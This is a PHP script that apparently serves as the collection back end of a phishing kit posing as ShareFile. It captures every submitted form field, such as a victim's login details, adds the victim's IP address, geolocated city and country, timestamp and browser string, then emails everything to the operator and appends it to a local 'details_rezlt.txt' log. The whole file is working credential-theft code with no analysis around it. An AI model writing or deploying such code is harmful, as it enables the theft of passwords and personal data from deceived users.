<?php

require_once('email_config.php');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$message = "-----|Sharefile|-----\n";

foreach ($_POST as $param_name => $param_val) {
    $message .= $param_val."\n";
}

$message .= "IP : " .$ip. "\n";
$message .= "--------------------------\n";
$message .=     "City: {$geoplugin->city}\n";
$message .=     "Region: {$geoplugin->region}\n";
$message .=     "Country Name: {$geoplugin->countryName}\n";
$message .=     "Country Code: {$geoplugin->countryCode}\n";
$message .=     "Date: ".date("D M d, Y g:i a")."\n";
$message .=     "Browser Details: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--------------------------\n";

$subj = " Sharefile |- " . $ip . "\n";

mail($email, $subj, $message, $from);

file_put_contents('../details_rezlt.txt', $message, FILE_APPEND);

?>